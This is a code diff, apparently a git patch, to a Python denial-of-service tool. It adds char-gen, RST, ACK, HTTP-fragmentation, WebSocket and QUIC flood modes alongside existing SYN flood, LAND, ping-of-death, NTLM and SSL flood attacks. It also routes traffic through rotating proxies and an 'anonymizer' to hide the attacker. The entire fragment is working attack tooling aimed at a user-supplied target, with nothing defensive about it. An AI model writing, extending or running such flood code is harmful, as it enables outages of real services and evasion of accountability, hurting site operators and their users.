+                            proxy=proxy,
+                            timeout=aiohttp.ClientTimeout(total=10)
+                        ) as response:
+                            with requests_lock:
+                                requests_sent += 1
+                                if response.status in [200, 201, 204]:
+                                    successful_requests += 1
+                                else:
+                                    failed_requests += 1
+                except Exception as e:
+                    with requests_lock:
+                        failed_requests += 1
+                    logger.error(f"Error during QUIC flood: {e}")
+                await asyncio.sleep(pause_time)
+
 # ================== MONITORING AND STATISTICS ==================                
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
-    """Display real-time attack statistics and save results.
-    
-    Args:
-        stop_event (threading.Event): Event to signal monitoring stop
-        duration (int): Total attack duration in seconds
-        results_file (str, optional): File to save JSON results
-    """
+    """Display real-time attack statistics and save results."""
     start_time = time.time()
     results = []
     with tqdm(total=duration, desc="Progress") as pbar:
@@ -1169,11 +1091,7 @@ def display_status(stop_event: threading.Event, duration: int, results_file=None
         print(f"Results saved to {results_file}")
 
 def calculate_rps_stats():
-    """Calculate requests-per-second statistics.
-    
-    Returns:
-        dict: Dictionary with min, max, and average RPS
-    """
+    """Calculate requests-per-second statistics."""
     if not rps_history:
         return {"min": 0, "max": 0, "avg": 0}
     return {
@@ -1186,7 +1104,7 @@ def signal_handler(sig, frame):
     """Handle interrupt signals for graceful shutdown."""
     global stop_event
     logging.info(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
-    stop_event.set()  # Signal all threads to stop
+    stop_event.set()
     sys.exit(0)
 
 # ================== MAIN FUNCTION ==================
@@ -1194,7 +1112,6 @@ async def main():
     """Main function to coordinate attack execution."""
     args = parse_args()
 
-    # Display help or version if requested
     if args.help or len(sys.argv) == 1:
         display_help()
         sys.exit(0)
@@ -1206,29 +1123,23 @@ async def main():
 
     display_banner()
 
-    # Handle signals for graceful exit
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
     if args.interactive:
-        # Start interactive mode (implementation would go here)
         print(f"{YELLOW}Interactive mode not yet implemented. Using command-line arguments.{RESET}")
 
-    # Validate input parameters
     if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
         print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
         exit(1)
 
-    # Load and validate proxies if specified
     proxies = load_proxies(args.proxies) if args.proxies else []
     if proxies:
         proxies = validate_proxies(proxies)
         asyncio.create_task(monitor_proxy_health(proxies))
 
-    # Resolve target
     target = args.url.split("//")[-1].split("/")[0] if args.url else None
 
-    # Handle scanning and utility functions
     if args.scan and target:
         target_ip = await resolve_target(target)
         if target_ip:
@@ -1245,20 +1156,43 @@ async def main():
         run_anonymizer(args.anonymizer)
         exit(0)
 
-    # Validate target URL for attack modes
     if not args.url and not args.interactive:
         print(f"{RED}Error: Target URL is required for attack modes.{RESET}")
         display_help()
         exit(1)
 
-    # Start attack based on selected mode
     stop_event = threading.Event()
     tasks = []
 
     # New attack modes
-    if args.attack_mode == "land-attack":
+    if args.attack_mode == "char-gen":
         target_ip = await resolve_target(target)
-        target_port = 80  # Default port for LAND attack
+        target_port = 19  # Default port for char-gen
+        threading.Thread(target=char_gen_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "rst-flood":
+        target_ip = await resolve_target(target)
+        target_port = 80  # Default port for RST flood
+        threading.Thread(target=rst_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "ack-flood":
+        target_ip = await resolve_target(target)
+        target_port = 80  # Default port for ACK flood
+        threading.Thread(target=ack_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "http-fragmentation":
+        for _ in range(args.threads):
+            task = asyncio.create_task(http_fragmentation_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            tasks.append(task)
+    elif args.attack_mode == "ws-dos":
+        for _ in range(args.threads):
+            task = asyncio.create_task(ws_dos_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            tasks.append(task)
+    elif args.attack_mode == "quic-flood":
+        for _ in range(args.threads):
+            task = asyncio.create_task(quic_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            tasks.append(task)
+    # Existing attack modes
+    elif args.attack_mode == "land-attack":
+        target_ip = await resolve_target(target)
+        target_port = 80
         threading.Thread(target=land_attack, args=(target_ip, target_port, args.duration)).start()
     elif args.attack_mode == "ping-of-death":
         target_ip = await resolve_target(target)
@@ -1275,7 +1209,6 @@ async def main():
         for _ in range(args.threads):
             task = asyncio.create_task(ntlm_auth_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
             tasks.append(task)
-    # Existing attack modes
     elif args.attack_mode == "syn-flood":
         target_ip = await resolve_target(target)
         target_port = 80
@@ -1342,26 +1275,21 @@ async def main():
             task = asyncio.create_task(ssl_flood_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
             tasks.append(task)
 
-    # Display status in a separate thread
-    if tasks or args.attack_mode in ["syn-flood", "land-attack", "ping-of-death"]:
+    if tasks or args.attack_mode in ["syn-flood", "land-attack", "ping-of-death", "char-gen", "rst-flood", "ack-flood"]:
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
 
-    # Wait for the specified duration, then stop all tasks
     await asyncio.sleep(args.duration)
     stop_event.set()
 
-    # Wait for all asyncio tasks to complete
     if tasks:
         await asyncio.gather(*tasks, return_exceptions=True)
 
-    # Display final statistics
     stats = calculate_rps_stats()
     print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")
 
     if args.results:
         print(f"{GREEN}Results saved to {args.results}{RESET}")
 
-    # If anonymizer was enabled, stop it after the attack
     if args.anonymizer == "start":
         print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
         run_anonymizer("stop")
